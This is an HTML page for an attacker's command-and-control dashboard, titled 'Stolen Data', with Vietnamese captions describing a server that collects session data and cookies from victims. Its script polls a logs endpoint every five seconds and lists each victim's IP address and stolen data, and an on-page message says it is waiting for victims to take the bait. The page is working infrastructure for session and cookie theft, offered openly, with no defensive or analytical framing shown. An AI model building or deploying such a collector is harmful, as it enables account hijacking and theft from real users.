<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Dashboard - Stolen Data 😈</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0d1117;
            --card: #161b22;
            --text: #c9d1d9;
            --primary: #238636;
            --accent: #58a6ff;
            --alert: #f85149;
        }

        body {
            font-family: 'Fira Code', monospace;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 40px;
        }

        .header {
            text-align: center;
            margin-bottom: 50px;
        }

        h1 {
            color: var(--alert);
            font-size: 2.5rem;
            text-transform: uppercase;
            letter-spacing: 4px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        .log-item {
            background: var(--card);
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .log-item::before {
            content: "";
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            width: 4px;
            background: var(--alert);
        }

        .time {
            color: var(--accent);
            font-size: 0.8rem;
            margin-bottom: 10px;
        }

        .ip {
            color: var(--primary);
            font-size: 0.8rem;
            margin-bottom: 10px;
        }

        .data {
            background: #000;
            padding: 15px;
            border-radius: 4px;
            font-size: 0.9rem;
            white-space: pre-wrap;
            word-break: break-all;
            color: #00ff00;
            border-left: 2px solid #00ff00;
        }

        .data strong {
            color: var(--alert);
        }

        .refresh-btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            margin-bottom: 20px;
            font-family: inherit;
        }

        .refresh-btn:hover { opacity: 0.8; }
        
        .empty-msg {
          text-align: center;
          color: #8b949e;
          margin-top: 50px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>C2 Server - Stolen Data</h1>
            <p>Máy chủ thu thập Session & Cookies từ nạn nhân</p>
        </div>

        <button class="refresh-btn" onclick="loadLogs()">Làm mới dữ liệu</button>

        <div id="logs-container"></div>
    </div>

    <script>
        async function loadLogs() {
            const res = await fetch('/api/logs');
            const logs = await res.json();
            const container = document.getElementById('logs-container');
            
            if (logs.length === 0) {
              container.innerHTML = '<div class="empty-msg">Chưa có dữ liệu nào được gửi về... Đang chờ nạn nhân mắc bẫy 📡</div>';
              return;
            }

            container.innerHTML = logs.map(log => `
                <div class="log-item">
                    <div class="time">[TIME] ${new Date(log.time).toLocaleString()}</div>
                    <div class="ip">[IP] ${log.ip}</div>
                    <div class="data"><strong>[STOLEN_DATA]:</strong> ${log.data}</div>
                </div>
            `).join('');
        }

        // Auto refresh every 5 seconds
        setInterval(loadLogs, 5000);
        loadLogs();
    </script>
</body>
</html>
